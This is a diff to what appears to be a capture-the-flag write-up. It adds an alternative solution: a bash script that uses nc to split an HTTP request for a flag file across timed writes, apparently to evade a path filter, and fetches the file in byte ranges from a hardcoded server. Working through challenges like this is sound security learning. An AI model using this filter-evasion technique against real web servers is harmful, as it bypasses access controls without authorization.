@@ -471,3 +471,61 @@ if __name__ == "__main__":
 
 <img width="1004" height="752" alt="image" src="https://github.com/user-attachments/assets/9f4e2dd0-7007-423b-bda9-231c2697fcfb" />
 
+
+
+---
+----
+
+
+# another solution 
+
+
+```bash
+#!/bin/bash
+# get_flag.sh
+
+SERVER="35.227.38.232"
+PORT="5000"
+
+# Function to make split request
+split_request() {
+  local range="$1"
+  (
+    echo -n 'GET /fla'
+    sleep 0.5
+    echo 'g.html HTTP/1.1'
+    echo "Host: $SERVER"
+    echo "Range: bytes=$range"
+    echo 'Connection: close'
+    echo ''
+  ) | nc $SERVER $PORT 2>/dev/null
+}
+
+# Get different ranges
+echo "Getting flag pieces..."
+split_request "0-49" | tail -c +$(($(split_request "0-49" | grep -n "^$" | head -2 | tail -1 | cut -d: -f1) + 1))
+split_request "50-99" | tail -c +$(($(split_request "50-99" | grep -n "^$" | head -2 | tail -1 | cut -d: -f1) + 1))
+split_request "100-110" | tail -c +$(($(split_request "100-110" | grep -n "^$" | head -2 | tail -1 | cut -d: -f1) + 1))
+split_request "111-120" | tail -c +$(($(split_request "111-120" | grep -n "^$" | head -2 | tail -1 | cut -d: -f1) + 1))
+split_request "141-149" | tail -c +$(($(split_request "141-149" | grep -n "^$" | head -2 | tail -1 | cut -d: -f1) + 1))
+split_request "150-212" | tail -c +$(($(split_request "150-212" | grep -n "^$" | head -2 | tail -1 | cut -d: -f1) + 1))
+```
+
+
+
+<img width="1081" height="767" alt="image" src="https://github.com/user-attachments/assets/028bc8d6-7b05-4e1d-be6c-dfd8c8be805f" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
